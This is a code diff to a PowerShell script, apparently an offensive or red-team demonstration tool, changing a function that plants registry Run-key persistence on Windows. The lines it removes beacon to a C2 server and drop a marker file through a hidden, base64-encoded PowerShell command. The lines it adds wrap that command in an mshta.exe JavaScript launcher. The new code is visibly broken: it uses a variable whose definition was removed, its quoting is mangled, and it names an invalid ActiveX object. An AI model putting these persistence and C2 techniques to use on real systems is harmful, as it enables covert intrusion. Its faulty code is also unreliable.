@@ -296,18 +296,13 @@ function Show-RegistryPersistence {
     # Desktop path where the payload will create a marker file on user logon
     $desktopPath = [Environment]::GetFolderPath('Desktop')
 
-    # Payload to run at user logon:
-    # - Send a simple GET to the configured C2 server to say "hi"
-    # - Create a marker file on the user's Desktop called 'HI.txt'
-    $payload = @"
-try {
-    Invoke-RestMethod -Uri '$Global:C2Url/?message=hi&session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue
-    Add-Content -Path '$desktopPath\HI.txt' -Value 'Successfully executed payload via Reg Run Key.' -ErrorAction SilentlyContinue
-} catch { }
-"@
-
-    $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
-    $runValue = "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload"
+    # The payload (now a single string) remains Base64 encoded
+    # We will execute it using mshta.exe
+    $payload = "powershell.exe -WindowStyle Hidden -EncodedCommand `"$encodedPayload`""
+    
+    # The MSHTA wrapper executes the payload string in memory via JavaScript
+    # This entire string is what gets written to the Run key.
+    $runValue = "mshta.exe \"javascript:var s = new ActiveXObject('Scripting.FileSystemObject'); s.CreateTextFile('powershell.exe', true).Write('$payload'); new ActiveXObject('Scripting.Shell').Run(\"powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload\")');"
 
     if ($Global:DemoMode) {
         Write-Host "    [*] Demonstrating registry-based persistence concepts (LOGGING ONLY):" -ForegroundColor Gray
@@ -327,6 +322,7 @@ try {
         }
     }
 }
+
 
 function Undo-LiveChanges {
     Write-Host "[*] Undo requested: reverting live changes" -ForegroundColor Cyan
